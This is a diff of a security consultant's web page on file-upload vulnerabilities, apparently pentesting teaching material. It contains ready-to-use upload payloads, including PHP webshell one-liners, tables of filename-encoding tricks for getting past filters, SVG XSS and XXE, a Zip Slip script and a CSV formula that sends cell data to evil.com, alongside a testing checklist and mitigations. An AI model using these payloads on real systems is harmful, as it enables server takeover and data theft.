@@ -7,7 +7,6 @@
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <style>
-    /* Same base styles as other pages – omitted for brevity, copy from previous pages */
     * { margin: 0; padding: 0; box-sizing: border-box; }
     :root { --primary: #00f5a0; --bg-dark: #0a0c10; --bg-card: #111827; --bg-elevated: #1a1f2e; --text-primary: #e8edf5; --text-secondary: #9ca3af; --border: #1f2937; }
     body.light { --bg-dark: #f3f4f6; --bg-card: #ffffff; --bg-elevated: #e5e7eb; --text-primary: #111827; --text-secondary: #4b5563; --border: #d1d5db; }
@@ -29,74 +28,195 @@
     .severity-badge { display: inline-block; background: rgba(255, 68, 68, 0.2); color: #ff4444; padding: 0.3rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
     .content-section { margin: 2rem 0; }
     .content-section h2 { font-size: 1.5rem; margin: 1.5rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; }
+    .content-section h3 { font-size: 1.2rem; margin: 1rem 0 0.5rem; }
+    .content-section p { margin-bottom: 1rem; color: var(--text-secondary); }
+    .content-section ul, .content-section ol { margin: 1rem 0 1.5rem 2rem; color: var(--text-secondary); }
+    .content-section li { margin-bottom: 0.5rem; }
     .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.85rem; color: var(--primary); position: relative; }
     .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: none; padding: 0.2rem 0.5rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.7rem; }
     .copy-btn:hover { color: var(--primary); }
+    .payload-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 0.5rem; margin: 1rem 0; }
+    .payload-item { background: var(--bg-elevated); border: 1px solid var(--border); border-radius: 0.5rem; padding: 0.5rem; font-family: monospace; font-size: 0.75rem; word-break: break-all; }
+    .bypass-table { width: 100%; border-collapse: collapse; background: var(--bg-card); border: 1px solid var(--border); margin: 1rem 0; }
+    .bypass-table th, .bypass-table td { padding: 0.5rem; text-align: left; border-bottom: 1px solid var(--border); font-family: monospace; font-size: 0.75rem; }
+    .bypass-table th { background: var(--bg-elevated); color: var(--primary); }
+    .vulnerability-box { background: rgba(255, 68, 68, 0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .mitigation-box { background: rgba(0, 245, 160, 0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
     .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
     footer { text-align: center; padding: 2rem; border-top: 1px solid var(--border); color: var(--text-secondary); font-size: 0.8rem; }
-    @media (max-width: 768px) { .container { padding: 0 1rem; } .mobile-menu { display: block; } .nav-links { display: none; width: 100%; flex-direction: column; padding: 1rem 0; gap: 1rem; } .nav-links.show { display: flex; } .page-header h1 { font-size: 1.8rem; } }
+    @media (max-width: 768px) {
+      .container { padding: 0 1rem; }
+      .mobile-menu { display: block; }
+      .nav-links { display: none; width: 100%; flex-direction: column; padding: 1rem 0; gap: 1rem; }
+      .nav-links.show { display: flex; }
+      .page-header h1 { font-size: 1.8rem; }
+      .bypass-table { font-size: 0.7rem; }
+    }
   </style>
 </head>
 <body>
-  <!-- Navigation same as other pages -->
-  <nav class="navbar">...</nav>
-  <main>
-    <div class="container">
-      <div class="breadcrumb"><a href="../knowledge-base.html">Knowledge Base</a> / <a href="index.html">Web Security</a> / File Upload Vulnerabilities</div>
-      <div class="page-header">
-        <span class="severity-badge"><i class="fas fa-exclamation-triangle"></i> Critical Severity</span>
-        <h1>📁 File Upload Vulnerabilities – Complete Checklist</h1>
-      </div>
 
-      <div class="content-section">
-        <h2>📌 Attack Surface & Extensions Impact</h2>
-        <ul>
-          <li><strong>ASP, ASPX, PHP5, PHP, PHP3</strong> → Webshell, RCE</li>
-          <li><strong>SVG</strong> → Stored XSS, SSRF, XXE</li>
-          <li><strong>GIF</strong> → Stored XSS, SSRF</li>
-          <li><strong>CSV</strong> → CSV injection</li>
-          <li><strong>XML</strong> → XXE</li>
-          <li><strong>AVI</strong> → LFI, SSRF</li>
-          <li><strong>HTML, JS</strong> → HTML injection, XSS, open redirect</li>
-          <li><strong>PNG, JPEG</strong> → Pixel flood attack (DoS)</li>
-          <li><strong>ZIP</strong> → RCE via LFI, DoS</li>
-          <li><strong>PDF, PPTX</strong> → SSRF, Blind XXE</li>
-        </ul>
-      </div>
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar.<span>Raju</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Resume</a></li>
+      <li><a href="../knowledge-base.html">Knowledge Base</a></li>
+      <li><a href="../status.html">Status</a></li>
+      <li><a href="../blog.html">Write-ups</a></li>
+      <li><a href="../tools.html">Tools</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> Dark</button></li>
+    </ul>
+  </div>
+</nav>
 
-      <div class="content-section">
-        <h2>🛡️ Bypass Techniques</h2>
-        <h3>Blacklisting Bypass</h3>
-        <ul>
-          <li>PHP → .phtml, .pht, .php2, .php3, .php4, .php5, .shtml, .phar, .inc</li>
-          <li>ASP → .asp, .aspx, .cer, .asa</li>
-          <li>JSP → .jsp, .jspx, .jsw, .jsv, .jspf</li>
-          <li>Coldfusion → .cfm, .cfml, .cfc, .dbm</li>
-          <li>Random capitalization → .php, .pHp, .PhAr</li>
-        </ul>
-        <h3>Whitelisting Bypass</h3>
-        <ul>
-          <li>Double extensions: file.jpg.php, file.php.jpg</li>
-          <li>Null byte: file.php%00.jpg, file.php\x00.jpg</li>
-          <li>Special chars: file.php%20, file.php%0d%0a.jpg, file.php..... , file.php/ , file.php\</li>
-        </ul>
-        <h3>Content‑Type & Magic Number Bypass</h3>
-        <ul>
-          <li>Change Content‑Type to image/gif, image/png, image/jpeg</li>
-          <li>Prepend magic bytes: <code>echo -e '\xFF\xD8\xFF\xE0\n&lt;?php system($_GET['cmd']); ?>' > shell.jpg.php</code></li>
-          <li>Use exiftool to inject PHP into JPEG comments: <code>exiftool -Comment='&lt;?php system($_GET['cmd']); ?>' pic.jpg</code></li>
-        </ul>
-      </div>
+<main>
+  <div class="container">
+    <div class="breadcrumb"><a href="../knowledge-base.html">Knowledge Base</a> / <a href="index.html">Web Security</a> / File Upload Vulnerabilities</div>
+    <div class="page-header">
+      <span class="severity-badge"><i class="fas fa-exclamation-triangle"></i> Critical Severity</span>
+      <h1>📁 File Upload Vulnerabilities – Complete Guide</h1>
+      <p>Bypass techniques, webshells, XSS via SVG, Zip Slip, extension splitting, and advanced encoding attacks.</p>
+    </div>
 
-      <div class="content-section">
-        <h2>💣 Advanced Payloads via Upload</h2>
-        <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
-          <pre># SVG XSS
-&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">&lt;/svg>
+    <!-- ==================== ATTACK SURFACE & IMPACT ==================== -->
+    <div class="content-section">
+      <h2>🎯 Attack Surface & Extensions Impact</h2>
+      <ul>
+        <li><strong>ASP, ASPX, PHP5, PHP, PHP3</strong> → Webshell, RCE</li>
+        <li><strong>SVG</strong> → Stored XSS, SSRF, XXE</li>
+        <li><strong>GIF</strong> → Stored XSS, SSRF</li>
+        <li><strong>CSV</strong> → CSV injection</li>
+        <li><strong>XML</strong> → XXE</li>
+        <li><strong>AVI</strong> → LFI, SSRF</li>
+        <li><strong>HTML, JS</strong> → HTML injection, XSS, open redirect</li>
+        <li><strong>PNG, JPEG</strong> → Pixel flood attack (DoS)</li>
+        <li><strong>ZIP</strong> → RCE via LFI, DoS</li>
+        <li><strong>PDF, PPTX</strong> → SSRF, Blind XXE</li>
+      </ul>
+    </div>
+
+    <!-- ==================== BYPASS TECHNIQUES ==================== -->
+    <div class="content-section">
+      <h2>🛡️ Bypass Techniques</h2>
+      <h3>Blacklisting Bypass</h3>
+      <ul>
+        <li>PHP → .phtml, .pht, .php2, .php3, .php4, .php5, .shtml, .phar, .inc</li>
+        <li>ASP → .asp, .aspx, .cer, .asa</li>
+        <li>JSP → .jsp, .jspx, .jsw, .jsv, .jspf</li>
+        <li>Coldfusion → .cfm, .cfml, .cfc, .dbm</li>
+        <li>Random capitalization → .php, .pHp, .PhAr</li>
+      </ul>
+      <h3>Whitelisting Bypass</h3>
+      <ul>
+        <li>Double extensions: file.jpg.php, file.php.jpg</li>
+        <li>Null byte: file.php%00.jpg, file.php\x00.jpg</li>
+        <li>Special chars: file.php%20, file.php%0d%0a.jpg, file.php..... , file.php/ , file.php\</li>
+      </ul>
+      <h3>Content‑Type & Magic Number Bypass</h3>
+      <ul>
+        <li>Change Content‑Type to image/gif, image/png, image/jpeg</li>
+        <li>Prepend magic bytes: <code>echo -e '\xFF\xD8\xFF\xE0\n&lt;?php system($_GET['cmd']); ?>' > shell.jpg.php</code></li>
+        <li>Use exiftool to inject PHP into JPEG comments: <code>exiftool -Comment='&lt;?php system($_GET['cmd']); ?>' pic.jpg</code></li>
+      </ul>
+    </div>
+
+    <!-- ==================== ADVANCED EXTENSION SPLITTING (NEW) ==================== -->
+    <div class="content-section">
+      <h2>🧪 Advanced Extension Splitting – Encoding & Special Characters</h2>
+      <p>Many modern filters look for simple patterns like <code>.php</code> or <code>.jpg</code>. By injecting control characters, newlines, tabs, or encoded sequences, attackers can split the extension in a way that the server interprets differently from the filter. The following payloads bypass many naive blacklists and WAFs.</p>
+      <p><strong>Source:</strong> @therceman (Anton) – Bug Bounty Tips & Tricks</p>
+
+      <h3>🔹 Newline / Tab / Carriage Return Injection</h3>
+      <table class="bypass-table">
+        <thead><tr><th>Payload</th><th>Description</th></tr></thead>
+        <tbody>
+          <tr><td>qwe.php\n.png</td><td>Line feed (LF)</td></tr>
+          <tr><td>qwe.php\r.png</td><td>Carriage return (CR)</td></tr>
+          <tr><td>qwe.php\t.png</td><td>Tab</td></tr>
+          <tr><td>qwe.php\x0d.png</td><td>Hex CR</td></tr>
+          <tr><td>qwe.php\x0a.png</td><td>Hex LF</td></tr>
+          <tr><td>qwe.php\x09.png</td><td>Hex Tab</td></tr>
+          <tr><td>qwe.php%0d.png</td><td>URL-encoded CR</td></tr>
+          <tr><td>qwe.php%0a.png</td><td>URL-encoded LF</td></tr>
+          <tr><td>qwe.php%09.png</td><td>URL-encoded Tab</td></tr>
+        </tbody>
+      </table>
+
+      <h3>🔹 HTML / XML Entity Encoding</h3>
+      <table class="bypass-table">
+        <thead><tr><th>Payload</th><th>Description</th></tr></thead>
+        <tbody>
+          <tr><td>qwe.php&#13;png</td><td>Decimal CR</td></tr>
+          <tr><td>qwe.php&#10;png</td><td>Decimal LF</td></tr>
+          <tr><td>qwe.php&#09;png</td><td>Decimal Tab</td></tr>
+          <tr><td>qwe.php&#x0d;png</td><td>Hex CR</td></tr>
+          <tr><td>qwe.php&#x0a;png</td><td>Hex LF</td></tr>
+          <tr><td>qwe.php&#x09;png</td><td>Hex Tab</td></tr>
+        </tbody>
+      </table>
+
+      <h3>🔹 Unicode / Overlong UTF-8 Encoding</h3>
+      <table class="bypass-table">
+        <thead><tr><th>Payload</th><th>Description</th></tr></thead>
+        <tbody>
+          <tr><td>qwe.php\u000d.png</td><td>Unicode CR</td></tr>
+          <tr><td>qwe.php\u000a.png</td><td>Unicode LF</td></tr>
+          <tr><td>qwe.php\u0099.png</td><td>Unicode Tab</td></tr>
+          <tr><td>qwe.php%C0%8d.png</td><td>Overlong UTF-8 CR</td></tr>
+          <tr><td>qwe.php%C0%8a.png</td><td>Overlong UTF-8 LF</td></tr>
+          <tr><td>qwe.php%C0%89.png</td><td>Overlong UTF-8 Tab</td></tr>
+          <tr><td>qwe.php%E5%98%8d.png</td><td>3‑byte UTF-8 CR</td></tr>
+          <tr><td>qwe.php%E5%98%8a.png</td><td>3‑byte UTF-8 LF</td></tr>
+          <tr><td>qwe.php%E5%98%89.png</td><td>3‑byte UTF-8 Tab</td></tr>
+          <tr><td>qwe.php%E0%80%8d.png</td><td>Overlong 3‑byte CR</td></tr>
+        </tbody>
+      </table>
+
+      <h3>🔹 Hash / Fragment Injection</h3>
+      <table class="bypass-table">
+        <thead><tr><th>Payload</th><th>Description</th></tr></thead>
+        <tbody>
+          <tr><td>qwe.php#.png</td><td>Fragment separator</td></tr>
+          <tr><td>qwe.php%23.png</td><td>URL-encoded #</td></tr>
+          <tr><td>qwe.php\x23.png</td><td>Hex #</td></tr>
+          <tr><td>qwe.php&#35;png</td><td>Decimal #</td></tr>
+          <tr><td>qwe.php&#x23;png</td><td>Hex #</td></tr>
+          <tr><td>qwe.php\u0023.png</td><td>Unicode #</td></tr>
+        </tbody>
+      </table>
+
+      <h3>🔹 Semicolon / Null Byte / Space</h3>
+      <table class="bypass-table">
+        <thead><tr><th>Payload</th><th>Description</th></tr></thead>
+        <tbody>
+          <tr><td>qwe.php&#59;png</td><td>Decimal semicolon</td></tr>
+          <tr><td>qwe.php&#x3b;png</td><td>Hex semicolon</td></tr>
+          <tr><td>qwe.php\u003b.png</td><td>Unicode semicolon</td></tr>
+          <tr><td>qwe.php%C0%bb.png</td><td>Overlong UTF-8 semicolon</td></tr>
+          <tr><td>qwe.php\u0000.png</td><td>Null byte</td></tr>
+          <tr><td>qwe.php\u0020.png</td><td>Space</td></tr>
+          <tr><td>qwe.php\x20.png</td><td>Hex space</td></tr>
+        </tbody>
+      </table>
+
+      <div class="vulnerability-box">
+        <strong>💡 Lesson:</strong> If your validation relies ONLY on extension checks or simple blacklists, it is already broken. Validate like a defender – use allowlists, content inspection, and rename files entirely.
+      </div>
+    </div>
+
+    <!-- ==================== PAYLOADS (XSS, SSRF, XXE, ZIP) ==================== -->
+    <div class="content-section">
+      <h2>💣 Advanced Payloads via Upload</h2>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># SVG XSS
+&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">&lt;/svg&gt;
 
 # SVG XXE
 &lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
-&lt;svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg">&lt;text font-size="40" x="0" y="16">&amp;xxe;&lt;/text>&lt;/svg>
+&lt;svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg">&lt;text font-size="40" x="0" y="16">&amp;xxe;&lt;/text>&lt;/svg&gt;
 
 # ImageTragick (ImageMagick RCE)
 push graphic-context
@@ -107,53 +227,66 @@ pop graphic-context
 # Zip Slip – malicious ZIP
 python3 -c 'import zipfile; zf=zipfile.ZipFile("malicious.zip","w"); zf.writestr("../../../../var/www/html/shell.php","&lt;?php system($_GET[\"cmd\"]); ?>"); zf.close()'
 
-# CSV injection (when exported)
+# CSV injection
 =HYPERLINK("http://evil.com/steal?data="&A1,"Click me")</pre>
-        </div>
       </div>
-
-      <div class="content-section">
-        <h2>⚙️ Testing Methodology (Checklist)</h2>
-        <ul>
-          <li>1. Upload .php → expected block</li>
-          <li>2. Change extension to .phtml, .php5, .phar → try to execute</li>
-          <li>3. Use double extension: .jpg.php or .php.jpg</li>
-          <li>4. Intercept request, change Content‑Type to image/gif</li>
-          <li>5. Add magic bytes (GIF89a) at start of PHP file</li>
-          <li>6. Use null byte in filename: shell.php%00.jpg</li>
-          <li>7. Upload SVG with XSS/XXE payload</li>
-          <li>8. Upload ZIP containing path traversal entries</li>
-          <li>9. Test for race condition (concurrent uploads)</li>
-          <li>10. Check if filename reflected (XSS, command injection)</li>
-        </ul>
-      </div>
-
-      <div class="content-section">
-        <h2>🛡️ Mitigation</h2>
-        <div class="mitigation-box">
-          <strong>✅ Allowlist extensions only</strong><br>
-          <strong>✅ Validate MIME type using magic numbers, not Content‑Type header</strong><br>
-          <strong>✅ Rename uploaded files to random names</strong><br>
-          <strong>✅ Store files outside webroot, serve via script with content‑disposition</strong><br>
-          <strong>✅ Disable script execution in upload directory (e.g., .htaccess)</strong><br>
-          <strong>✅ Scan uploaded files with antivirus</strong><br>
-          <strong>✅ Implement Content Security Policy to mitigate SVG XSS</strong>
-        </div>
-      </div>
-
-      <div class="content-section">
-        <h2>📚 References</h2>
-        <ul>
-          <li><a href="https://book.hacktricks.xyz/pentesting-web/file-upload" target="_blank">HackTricks – File Upload</a></li>
-          <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files" target="_blank">PayloadsAllTheThings – File Upload</a></li>
-          <li><a href="https://github.com/HolyBugx/HolyTips/blob/main/Checklist/File%20Upload.md" target="_blank">Shubham Rooter – File Upload Checklist</a></li>
-        </ul>
-      </div>
-
-      <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Web Security</a>
     </div>
-  </main>
-  <footer><p>Saikumar Raju — Cybersecurity Consultant | File Upload Vulnerabilities Checklist</p></footer>
-  <script>/* copy and dark mode as before */</script>
+
+    <!-- ==================== TESTING METHODOLOGY ==================== -->
+    <div class="content-section">
+      <h2>⚙️ Testing Methodology (Checklist)</h2>
+      <ul>
+        <li>1. Upload .php → expected block</li>
+        <li>2. Change extension to .phtml, .php5, .phar → try to execute</li>
+        <li>3. Use double extension: .jpg.php or .php.jpg</li>
+        <li>4. Intercept request, change Content‑Type to image/gif</li>
+        <li>5. Add magic bytes (GIF89a) at start of PHP file</li>
+        <li>6. Use null byte in filename: shell.php%00.jpg</li>
+        <li>7. Use newline / tab injection (see table above)</li>
+        <li>8. Upload SVG with XSS/XXE payload</li>
+        <li>9. Upload ZIP containing path traversal entries</li>
+        <li>10. Test for race condition (concurrent uploads)</li>
+        <li>11. Check if filename reflected (XSS, command injection)</li>
+      </ul>
+    </div>
+
+    <!-- ==================== MITIGATION ==================== -->
+    <div class="content-section">
+      <h2>🛡️ Mitigation</h2>
+      <div class="mitigation-box">
+        <strong>✅ Allowlist extensions only</strong><br>
+        <strong>✅ Validate MIME type using magic numbers, not Content‑Type header</strong><br>
+        <strong>✅ Rename uploaded files to random names (strip original extension entirely)</strong><br>
+        <strong>✅ Store files outside webroot, serve via script with content‑disposition</strong><br>
+        <strong>✅ Disable script execution in upload directory (e.g., .htaccess)</strong><br>
+        <strong>✅ Scan uploaded files with antivirus</strong><br>
+        <strong>✅ Implement Content Security Policy to mitigate SVG XSS</strong><br>
+        <strong>✅ Normalize filenames – remove control characters, newlines, tabs, and encoded sequences</strong>
+      </div>
+    </div>
+
+    <div class="content-section">
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https://book.hacktricks.xyz/pentesting-web/file-upload" class="reference-link" target="_blank" style="color: var(--primary);">HackTricks – File Upload</a></li>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files" class="reference-link" target="_blank" style="color: var(--primary);">PayloadsAllTheThings – File Upload</a></li>
+        <li><a href="https://github.com/HolyBugx/HolyTips/blob/main/Checklist/File%20Upload.md" class="reference-link" target="_blank" style="color: var(--primary);">Shubham Rooter – File Upload Checklist</a></li>
+        <li><a href="https://twitter.com/therceman" class="reference-link" target="_blank" style="color: var(--primary);">@therceman – Bug Bounty Tips (Extension Splitting)</a></li>
+      </ul>
+    </div>
+
+    <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Web Security</a>
+  </div>
+</main>
+
+<footer><p>Saikumar Raju — Cybersecurity Consultant | File Upload Vulnerabilities – Complete Guide</p></footer>
+
+<script>
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  if (mobileBtn) { mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show')); }
+  const themeToggle = document.getElementById('themeToggle'); if (themeToggle) { themeToggle.addEventListener('click', () => { document.body.classList.toggle('light'); const icon = themeToggle.querySelector('i'); if (document.body.classList.contains('light')) { icon.classList.remove('fa-moon'); icon.classList.add('fa-sun'); themeToggle.innerHTML = '<i class="fas fa-sun"></i> Light'; } else { icon.classList.remove('fa-sun'); icon.classList.add('fa-moon'); themeToggle.innerHTML = '<i class="fas fa-moon"></i> Dark'; } }); }
+  function copyCode(btn) { const code = btn.parentElement.querySelector('pre').innerText; navigator.clipboard.writeText(code); btn.innerText = 'Copied!'; setTimeout(() => { btn.innerText = 'Copy'; }, 2000); }
+</script>
 </body>
 </html>
